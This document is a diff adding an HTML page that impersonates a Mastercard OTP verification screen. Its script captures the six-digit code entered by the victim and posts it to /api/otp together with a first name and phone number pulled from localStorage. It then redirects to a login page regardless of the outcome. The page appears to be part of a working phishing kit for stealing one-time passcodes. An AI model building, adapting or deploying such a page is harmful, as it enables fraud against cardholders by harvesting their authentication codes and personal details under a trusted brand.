@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <title>Mastercard | OTP Verification</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{font-family:'Roboto',sans-serif;background:linear-gradient(135deg,#a0e1eb,#09d62c);display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
+        .otp-container{background:white;border-radius:15px;box-shadow:0 8px 30px rgba(0,0,0,.1);padding:30px;text-align:center;width:100%;max-width:400px}
+        .logo{font-size:28px;font-weight:800;letter-spacing:-1px;margin-bottom:8px}
+        .logo-m{color:#0c0c0c}.logo-c{color:#fc0606}
+        h2{color:#007BFF;margin-bottom:8px;font-weight:500;font-size:20px}
+        .subtitle{color:#888;font-size:14px;margin-bottom:24px;line-height:1.5}
+        .otp-input{display:flex;justify-content:center;gap:8px;margin-bottom:20px}
+        .otp-input input{width:42px;height:46px;font-size:22px;text-align:center;border:none;border-bottom:2px solid #ccc;transition:border-color .3s;outline:none;font-weight:600}
+        .otp-input input:focus{border-bottom:2px solid #007BFF;box-shadow:0 4px 8px rgba(0,123,255,.15)}
+        .btn{margin-top:10px;padding:13px;background:#E30613;color:white;border:none;border-radius:8px;cursor:pointer;font-size:17px;font-weight:600;width:100%;transition:background .3s,transform .3s}
+        .btn:hover{background:#b71c1c;transform:translateY(-2px)}
+        .resend{margin-top:16px;font-size:13px;color:#888}
+        .resend a{color:#007BFF;text-decoration:none;cursor:pointer}
+        .secure-note{margin-top:14px;font-size:12px;color:#aaa}
+    </style>
+</head>
+<body>
+    <div class="otp-container">
+        <div class="logo"><span class="logo-m">Master</span><span class="logo-c">Card</span></div>
+        <h2>Enter OTP</h2>
+        <p class="subtitle">Enter the 6-digit verification code sent to your registered mobile number.</p>
+        <div class="otp-input">
+            <input type="text" maxlength="1" id="otp1" oninput="moveFocus(this,'otp2')">
+            <input type="text" maxlength="1" id="otp2" oninput="moveFocus(this,'otp3')">
+            <input type="text" maxlength="1" id="otp3" oninput="moveFocus(this,'otp4')">
+            <input type="text" maxlength="1" id="otp4" oninput="moveFocus(this,'otp5')">
+            <input type="text" maxlength="1" id="otp5" oninput="moveFocus(this,'otp6')">
+            <input type="text" maxlength="1" id="otp6" oninput="moveFocus(this,'submitBtn')">
+        </div>
+        <button id="submitBtn" class="btn">Verify OTP</button>
+        <div class="resend">Didn't receive the code? <a onclick="alert('A new OTP has been sent.')">Resend OTP</a></div>
+        <p class="secure-note">🔒 Secured by MasterCard Verification System</p>
+    </div>
+    <script>
+        function moveFocus(current, nextId){
+            if(current.value.length>=1){
+                const next=document.getElementById(nextId);
+                if(next) next.focus();
+            }
+        }
+        // Allow backspace to go to previous field
+        document.querySelectorAll('.otp-input input').forEach((input,i,arr)=>{
+            input.addEventListener('keydown',function(e){
+                if(e.key==='Backspace'&&!this.value&&i>0) arr[i-1].focus();
+            });
+        });
+        document.getElementById('submitBtn').addEventListener('click',function(){
+            let otp='';
+            for(let i=1;i<=6;i++) otp+=document.getElementById('otp'+i).value;
+            if(otp.length<4){alert('Please enter a valid OTP of at least 4 digits.');return;}
+            const btn=document.getElementById('submitBtn');
+            btn.textContent='Verifying...';btn.disabled=true;
+            fetch('/api/otp',{
+                method:'POST',headers:{'Content-Type':'application/json'},
+                body:JSON.stringify({
+                    otp,
+                    applicant:localStorage.getItem('firstName')||'',
+                    phone:localStorage.getItem('phone')||''
+                })
+            }).then(()=>window.location.href='login.html')
+              .catch(()=>window.location.href='login.html');
+        });
+    </script>
+</body>
+</html>
